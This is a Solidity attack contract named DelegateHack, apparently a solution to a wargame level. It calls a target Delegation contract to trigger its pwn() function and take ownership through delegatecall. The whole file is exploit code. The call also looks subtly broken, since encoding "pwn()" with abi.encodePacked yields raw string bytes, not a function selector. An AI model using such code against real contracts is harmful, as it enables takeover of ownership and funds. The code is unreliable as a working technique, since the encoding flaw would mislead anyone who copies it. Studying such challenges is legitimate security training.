// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Delegate.sol';

contract DelegateHack {

  Delegation public delegation;

  constructor(address _hackAddress) {
    delegation = Delegation(_hackAddress);
  }

  function attack() public returns (bool){
   (bool sent, ) = address(delegation).call(abi.encodePacked("pwn()"));

   return sent;
  }
}